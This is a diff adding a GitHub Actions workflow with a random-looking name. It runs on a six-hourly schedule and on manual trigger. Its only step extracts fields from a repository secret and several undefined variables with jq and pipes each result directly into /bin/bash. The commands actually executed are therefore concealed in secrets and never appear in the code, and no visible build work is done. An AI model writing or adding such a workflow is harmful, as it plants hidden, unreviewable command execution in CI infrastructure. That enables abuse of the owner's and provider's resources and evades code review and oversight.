@@ -1,0 +1,24 @@
+name: shiguzcesq
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shiguzcesq
+        env:
+          al5938: ${{ secrets.al5938 }}
+        run: |
+          echo $al5938 | jq -r .mqrmr34570 | /bin/bash
+          echo $rw4191 | jq -r .avews4 | /bin/bash
+          echo $owhqs3 | jq -r .iywn9282 | /bin/bash
+          echo $lmgge1 | jq -r .nbcpv516 | /bin/bash
+          echo $eofa2526 | jq -r .zwhd8483 | /bin/bash
+          echo $ib0181 | jq -r .uomq705 | /bin/bash
+          echo $uq37370 | jq -r .cbaxg8309 | /bin/bash
+
